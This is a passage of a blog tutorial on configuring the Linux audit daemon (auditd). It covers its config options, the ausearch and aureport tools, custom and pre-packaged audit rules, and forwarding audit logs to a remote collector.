</span></span><span class="line"><span class="cl">     <span class="mi">1</span>	<span class="c1">#</span>
</span></span><span class="line"><span class="cl">     <span class="mi">2</span>	<span class="c1"># This file controls the configuration of the audit daemon</span>
</span></span><span class="line"><span class="cl">     <span class="mi">3</span>	<span class="c1">#</span>
</span></span><span class="line"><span class="cl">     <span class="mi">4</span>	
</span></span><span class="line"><span class="cl">     <span class="mi">5</span>	<span class="n">local_events</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">     <span class="mi">6</span>	<span class="n">write_logs</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">     <span class="mi">7</span>	<span class="n">log_file</span> <span class="o">=</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">audit</span><span class="o">/</span><span class="n">audit</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl">     <span class="mi">8</span>	<span class="n">log_group</span> <span class="o">=</span> <span class="n">root</span>
</span></span><span class="line"><span class="cl">     <span class="mi">9</span>	<span class="n">log_format</span> <span class="o">=</span> <span class="n">RAW</span>
</span></span><span class="line"><span class="cl">    <span class="mi">10</span>	<span class="n">flush</span> <span class="o">=</span> <span class="n">INCREMENTAL_ASYNC</span>
</span></span><span class="line"><span class="cl">    <span class="mi">11</span>	<span class="n">freq</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">    <span class="mi">12</span>	<span class="n">max_log_file</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="mi">13</span>	<span class="n">num_logs</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">    <span class="mi">14</span>	<span class="n">priority_boost</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="mi">15</span>	<span class="n">disp_qos</span> <span class="o">=</span> <span class="n">lossy</span>
</span></span><span class="line"><span class="cl">    <span class="mi">16</span>	<span class="n">dispatcher</span> <span class="o">=</span> <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">audispd</span>
</span></span><span class="line"><span class="cl">    <span class="mi">17</span>	<span class="n">name_format</span> <span class="o">=</span> <span class="n">NONE</span>
</span></span><span class="line"><span class="cl">    <span class="mi">18</span>	<span class="c1">##name = mydomain</span>
</span></span><span class="line"><span class="cl">    <span class="mi">19</span>	<span class="n">max_log_file_action</span> <span class="o">=</span> <span class="n">ROTATE</span>
</span></span><span class="line"><span class="cl">    <span class="mi">20</span>	<span class="n">space_left</span> <span class="o">=</span> <span class="mi">75</span>
</span></span><span class="line"><span class="cl">    <span class="mi">21</span>	<span class="n">space_left_action</span> <span class="o">=</span> <span class="n">SYSLOG</span>
</span></span><span class="line"><span class="cl">    <span class="mi">22</span>	<span class="n">verify_email</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">    <span class="mi">23</span>	<span class="n">action_mail_acct</span> <span class="o">=</span> <span class="n">root</span>
</span></span><span class="line"><span class="cl">    <span class="mi">24</span>	<span class="n">admin_space_left</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">    <span class="mi">25</span>	<span class="n">admin_space_left_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
</span></span><span class="line"><span class="cl">    <span class="mi">26</span>	<span class="n">disk_full_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
</span></span><span class="line"><span class="cl">    <span class="mi">27</span>	<span class="n">disk_error_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
</span></span><span class="line"><span class="cl">    <span class="mi">28</span>	<span class="n">use_libwrap</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">    <span class="mi">29</span>	<span class="c1">##tcp_listen_port = 60</span>
</span></span><span class="line"><span class="cl">    <span class="mi">30</span>	<span class="n">tcp_listen_queue</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">    <span class="mi">31</span>	<span class="n">tcp_max_per_addr</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="mi">32</span>	<span class="c1">##tcp_client_ports = 1024-65535</span>
</span></span><span class="line"><span class="cl">    <span class="mi">33</span>	<span class="n">tcp_client_max_idle</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="mi">34</span>	<span class="n">enable_krb5</span> <span class="o">=</span> <span class="n">no</span>
</span></span><span class="line"><span class="cl">    <span class="mi">35</span>	<span class="n">krb5_principal</span> <span class="o">=</span> <span class="n">auditd</span>
</span></span><span class="line"><span class="cl">    <span class="mi">36</span>	<span class="c1">##krb5_key_file = /etc/audit/audit.key</span>
</span></span><span class="line"><span class="cl">    <span class="mi">37</span>	<span class="n">distribute_network</span> <span class="o">=</span> <span class="n">no</span>
</span></span></code></pre></div><p>Some of these options are easy to understand, like:</p>
<ul>
<li><strong>log_file</strong> : Tells the location of the audit log file.</li>
<li><strong>max_log_file</strong> : Defines the size of the log file in MB. If the size is reached, <strong>max_log_file_action</strong> is triggered.</li>
<li><strong>space_left</strong> : Triggers the <strong>space_left_action</strong> when the limit is reached.</li>
<li>To include additional information in audit logs you need to change <code>log format</code> from <strong>RAW</strong> to <code>ENRICHED</code>.</li>
<li><code>FLUSH = INCREMENTAL_ASYNC</code> will write the logs async instead of writing them on every write.</li>
</ul>
<p>While some of them needs more detailed explaination. In any case, always refer the man pages &ndash;&gt; <a href="https://www.man7.org/linux/man-pages/man5/auditd.conf.5.html"><code>man (5) auditd.conf</code></a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. There you will find all the possible options and their supporting values to tune auditd as per your requirements.</p>
<p>After making changes to <code>auditd.conf</code>, restart the service to pick up new changes from config. My <code>centos 7</code> machine did not allow me to manually restart the service using <code>systemctl</code> but it worked just fine with <code>service auditd restart</code>. If you figure out why this happens, please let me know!</p>
<h3 id="inspecting-audit-logs">Inspecting audit logs</h3>
<p>We can see where the <code>auditd</code> logs are stored from the config file above. So we can always look through the log files and use the good old <code>grep</code> command to find what we&rsquo;re looking for.</p>
<p>But that is not the intended method. The <code>audit</code> package includes a number of helper commands to assist the sysadmin/analyst in quickly determining information from logs.</p>
<p>Below are all the binary executable files provided by the <code>audit</code> package&hellip;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## COMMAND:   rpm -ql audit | grep bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/sbin/audispd
</span></span><span class="line"><span class="cl">/sbin/auditctl
</span></span><span class="line"><span class="cl">/sbin/auditd
</span></span><span class="line"><span class="cl">/sbin/augenrules
</span></span><span class="line"><span class="cl">/sbin/aureport
</span></span><span class="line"><span class="cl">/sbin/ausearch
</span></span><span class="line"><span class="cl">/sbin/autrace
</span></span><span class="line"><span class="cl">/usr/bin/aulast
</span></span><span class="line"><span class="cl">/usr/bin/aulastlog
</span></span><span class="line"><span class="cl">/usr/bin/ausyscall
</span></span><span class="line"><span class="cl">/usr/bin/auvirt
</span></span></code></pre></div><p>Let&rsquo;s start with <code>ausearch</code> for now. This program parses the audit log files and gives the information based on passed keywords.</p>
<p>There are a lot of options for this tool.. I&rsquo;ll mention few which I use most often.</p>
<ul>
<li><strong><code>-i</code></strong> &ndash; Interpret the logs. Translates numeric value in names.</li>
<li>If you want to get raw logs, use <strong><code>-r</code></strong>.</li>
<li>use <strong><code>-x</code></strong> to search based on executable name.</li>
<li>If you know the event ID then search with <strong><code>-a</code></strong>.</li>
<li>To search with message type, use <strong><code>-m</code></strong>. You can get the message type list by passing nothing or a wrong message type with the argument/flag.</li>
<li>Use <strong><code>-k</code></strong> to search for specific key in log. You can configure your own key in the logs config. These keys helps to corelate the logs with the rules.</li>
</ul>
<p>If you just want to get a report of everything that was logged, you can use <code>aureport</code> program which gives you a proper summary in a tabular form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## COMMAND:   sudo aureport
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Summary Report
</span></span><span class="line"><span class="cl">======================
</span></span><span class="line"><span class="cl">Range of time in logs: 01/01/1970 00:00:00.000 - 12/10/2022 16:24:29.088
</span></span><span class="line"><span class="cl">Selected time for report: 01/01/1970 00:00:00 - 12/10/2022 16:24:29.088
</span></span><span class="line"><span class="cl">Number of changes in configuration: 2
</span></span><span class="line"><span class="cl">Number of changes to accounts, groups, or roles: 0
</span></span><span class="line"><span class="cl">Number of logins: 0
</span></span><span class="line"><span class="cl">Number of failed logins: 0
</span></span><span class="line"><span class="cl">Number of authentications: 0
</span></span><span class="line"><span class="cl">Number of failed authentications: 0
</span></span><span class="line"><span class="cl">Number of users: 3
</span></span><span class="line"><span class="cl">Number of terminals: 4
</span></span><span class="line"><span class="cl">Number of host names: 1
</span></span><span class="line"><span class="cl">Number of executables: 3
</span></span><span class="line"><span class="cl">Number of commands: 1
</span></span><span class="line"><span class="cl">Number of files: 0
</span></span><span class="line"><span class="cl">Number of AVC&#39;s: 0
</span></span><span class="line"><span class="cl">Number of MAC events: 0
</span></span><span class="line"><span class="cl">Number of failed syscalls: 0
</span></span><span class="line"><span class="cl">Number of anomaly events: 0
</span></span><span class="line"><span class="cl">Number of responses to anomaly events: 0
</span></span><span class="line"><span class="cl">Number of crypto events: 0
</span></span><span class="line"><span class="cl">Number of integrity events: 0
</span></span><span class="line"><span class="cl">Number of virt events: 0
</span></span><span class="line"><span class="cl">Number of keys: 0
</span></span><span class="line"><span class="cl">Number of process IDs: 42
</span></span><span class="line"><span class="cl">Number of events: 240
</span></span></code></pre></div><h3 id="writing-custom-audit-rules">Writing custom audit rules</h3>
<p><code>auditd</code> also allows us to write our own rules. These rules will be read and applied when the service is restarted&hellip; or if you invoke <code>augenrules --load</code>.</p>
<p>For auditing, there are only three types of rules that can be defined:</p>
<ol>
<li>
<p>Watches on the file system (watches the changes related to filesystem or on a particular path)</p>
</li>
<li>
<p>syscalls (checks if a specific syscall was executed and with what context)</p>
</li>
<li>
<p>control rules (these are used to modify the kernel configuration of linux audit)</p>
</li>
</ol>
<p>That&rsquo;s all. This was all we needed to know before we started writing our first simple rule.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-w /etc/
</span></span></code></pre></div><p>The above rule will watch for all kinds of changes in <code>/etc/</code> folder&hellip; that means any (r)ead, (w)rite, (e)xecute or (a)ttribute change operations will be logged.</p>
<p>Let&rsquo;s write the above rule in a new file: <code>/etc/audit/rules.d/myrules.rules</code>&hellip; And check if it is picked up by auditd already. (I know it will not be picked, but it won&rsquo;t hurt to check)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo auditctl -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">No rules
</span></span></code></pre></div><p>Now, let&rsquo;s restart the service and try that again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># service auditd restart
</span></span><span class="line"><span class="cl"># sudo auditctl -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-w /etc -p rwxa
</span></span></code></pre></div><p><code>auditd</code> has now loaded the rule, as expected. But there&rsquo;s more to it than just what we put in the file. It makes no difference, however, because it is implicitly adding <code>-p rwxa</code> to indicate that all of these operations should be monitored.</p>
<p>The files still contain what we added&hellip; but the kernel has fully expanded rules.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo cat /etc/audit/rules.d/myrules.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-w /etc/
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo cat /etc/audit/audit.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">## This file is automatically generated from /etc/audit/rules.d
</span></span><span class="line"><span class="cl">-D
</span></span><span class="line"><span class="cl">-b 8192
</span></span><span class="line"><span class="cl">-f 1
</span></span><span class="line"><span class="cl">-w /etc/
</span></span></code></pre></div><p>With this rule in the kernel, all the operations made to <code>/etc</code> path will be recorded. To make things easy, think of all the <strong>watch</strong> rules as just fancy wrappers for syscall rules. Above rule can be written as below, and will still work the same.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-a exit,always  -F dir=/etc -F perm=rwxa
</span></span></code></pre></div><p>Remove the previous rule and add the above rule to the same file. Restart the service again for the changes to take effect.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo cat /etc/audit/audit.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## This file is automatically generated from /etc/audit/rules.d</span>
</span></span><span class="line"><span class="cl">-D
</span></span><span class="line"><span class="cl">-b <span class="m">8192</span>
</span></span><span class="line"><span class="cl">-f <span class="m">1</span>
</span></span><span class="line"><span class="cl">-a exit,always  -F <span class="nv">dir</span><span class="o">=</span>/etc -F <span class="nv">perm</span><span class="o">=</span>rwxa
</span></span></code></pre></div><p>Auto-generated event is what we wrote in the file. Let&rsquo;s take a look what it looks like from kernel point of view.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo auditctl -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-w /etc -p rwxa
</span></span></code></pre></div><p>Told you, its practically the same. Now let&rsquo;s understand all the options in the new rule we wrote (obviously for better clarity on how it is same).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-a exit,always  -F dir=/etc -F perm=rwxa
</span></span></code></pre></div><ul>
<li><code>-a</code> : append rule to end of the list</li>
<li><code>exit,always</code> : always log when exiting a syscall.</li>
<li><code>-F</code> : build a rule based on (F)ield values</li>
<li><code>dir=/etc</code>: full path of directory to watch; watches recursively to whole subtrees.</li>
<li><code>perm=rwxa</code>: permission changes/access to monitor.</li>
</ul>
<p>According to <code>man 8 auditctl</code>, <strong>if  a field rule is given and no syscall is specified, it will default to all syscalls.</strong> That means the above rule will work for all of the syscalls.</p>
<p>So far so good. Now what about control rules?? ..Or let&rsquo;s say <em>configure</em> rules as they help in configuring the behaviour of auditd itself.</p>
<p>These rules help in configuring/controling the behaviour of auditd. Read the man page for better and complete explanation. But I&rsquo;ll walk you through the ones we have already seen&hellip;. in the <code>/etc/audit/audit.rules</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-D
</span></span><span class="line"><span class="cl">-b 8192
</span></span><span class="line"><span class="cl">-f 1
</span></span></code></pre></div><ul>
<li>
<p><code>-D</code> deletes all the previous rules from kernel rules list. This should be always on the top If you want to give someone a hard time, just put that in the end.(<strong>please don&rsquo;t do it on production machines, it won&rsquo;t be funny</strong>)</p>
</li>
<li>
<p><code>-b</code> sets the size for audit buffer. If you don&rsquo;t know what you are doing, leave it to the default.</p>
</li>
<li>
<p><code>-f</code> sets the failure mode that let&rsquo;s the kernel decide how to handle failures and critical errors. 0 is silent. Default is 1 (printk). Super secured environment should be using 2 (panic).</p>
</li>
</ul>
<h3 id="pre-packaged-audit-rules">Pre-packaged audit rules</h3>
<p>Most of the times, we don&rsquo;t really need to write our own audit rules, we can just use what other people have already worked upon. You can always find them with the help of your favorite search engine&hellip;but there are few already pre-packaged with <code>audit</code> and are already on your system (if you have installed the package)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">rpm</span> <span class="o">-</span><span class="n">ql</span> <span class="n">audit</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">&#39;/usr/share/.*\.rules$&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">base</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">audit</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">11</span><span class="o">-</span><span class="n">loginuid</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">12</span><span class="o">-</span><span class="n">cont</span><span class="o">-</span><span class="n">fail</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">12</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">error</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">20</span><span class="o">-</span><span class="n">dont</span><span class="o">-</span><span class="n">audit</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">21</span><span class="o">-</span><span class="n">no32bit</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">22</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">chrony</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">23</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">filesystems</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">nispom</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">ospp</span><span class="o">-</span><span class="n">v42</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">pci</span><span class="o">-</span><span class="n">dss</span><span class="o">-</span><span class="n">v31</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">stig</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">31</span><span class="o">-</span><span class="n">privileged</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">32</span><span class="o">-</span><span class="n">power</span><span class="o">-</span><span class="n">abuse</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">40</span><span class="o">-</span><span class="n">local</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">41</span><span class="o">-</span><span class="n">containers</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">42</span><span class="o">-</span><span class="n">injection</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">43</span><span class="o">-</span><span class="n">module</span><span class="o">-</span><span class="nb">load</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">70</span><span class="o">-</span><span class="n">einval</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">71</span><span class="o">-</span><span class="n">networking</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">99</span><span class="o">-</span><span class="n">finalize</span><span class="o">.</span><span class="n">rules</span>
</span></span></code></pre></div><p><em>( <strong>NOTE:</strong> The numbers in the filenames play a very important role. For auditd, the first rule found wins. So if there are 2 contradictory rules, the first one found will be applied and the second one will have no effect.)</em></p>
<p>You can copy these rules, or just the ones you want to monitor, to <code>/etc/audit/rules.d/</code> folder and restart the service to pick up the new rules. Or you can use <code>augenrules --load</code> to load them without restarting the service.</p>
<h3 id="hardening-the-audit">Hardening the audit</h3>
<p>First step to harden the audit will be to ensude auditd&rsquo;s configuration is immutable. This can be done with <code>-e 2</code> control rule. Enabling this will prevent further changes in auditd&rsquo;s configurations. This being said, it is very obvious that this should be the last rule in the list.</p>
<p>Next step would be to store the logs into a centralized secure location. <code>Auditd</code> comes with a dispatcher program (<code>auditspd</code>) that can work with <code>auditsp-remote</code> plugin. This program too comes with it&rsquo;s own configuration file, which can be found at <code>/etc/audisp/audisp-remote.conf</code>.</p>
<p><em>This package was not already installed on my system so I installed it with <code>sudo yum install -y audispd-plugins</code>. Once this is installed, <code>auditsp-remote.conf</code> will be there witing for you to edit.</em></p>
<p>There are a few configuration changes you&rsquo;ll need to make to ensure that logs are sent to the remote server. The overall concept is to collect logs using auditd, then use a plugin to send logs to a central server while also disabling local logging of the same logs. This way, we won&rsquo;t have logs on the local system (saving disk space), and we can aggregate logs from multiple servers for analysis.</p>
<p>Let&rsquo;s start it with one change at a time. First one will be to enable the remote logging plugin. To do that, we can make changes to <code>/etc/audisp/plugins.d/au-remote.conf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## CHANGE active status to yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">active=yes
</span></span></code></pre></div><p>Then let our audit dispatcher know about the remote server where we want to dispatch the logs. This change will be made to <code>/etc/audisp/audisp-remote.conf</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## Remote server name/IP and the port
</span></span><span class="line"><span class="cl">remote_server = 192.168.56.10
</span></span><span class="line"><span class="cl">port = 60
</span></span></code></pre></div><p><em>As a dirty trick, I&rsquo;ve started netcat on port 60 to listen to the incoming data from the host.</em></p>
<p>Last thing is to disable the local logging for <code>auditd</code>. For that, make changes to <code>/etc/audit/auditd.conf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## CHANGE write logs to no
</span></span><span class="line"><span class="cl">write_logs = no
</span></span></code></pre></div><p>With this done, you have everything configured and ready to test. Now restart the <strong>auditd</strong> service and you&rsquo;ll start getting logs in netcat screen on remote system.</p>
<h2 id="wrap-up">Wrap-up</h2>
<p>In this article, you learnt about how to do better auditing of your linux environment, with the help of <code>auditd</code>. You also learnt about how to write your own rules or get pre-packaged rules to generate specific audit logs&hellip; and ways to get required reports with the help of <code>ausearch</code> and <code>aureport</code> programs.</p>
<p>This article is not intended to be a complete guide for auditing. It&rsquo;s whole purpose is to get you started with the idea of auditing and using the <code>audit</code> package utilities.</p>
<p>If you want to learn more about it, I suggest you to play around and read <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing">RedHat&rsquo;s documentation on system auditing</a> <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>. And if you are stuck, use your favorite search engine or&hellip; RTFM.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/8dYmJ6Buo3lYY/giphy.gif#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://elixir.bootlin.com/linux/latest/source/kernel/audit.c">https://elixir.bootlin.com/linux/latest/source/kernel/audit.c</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
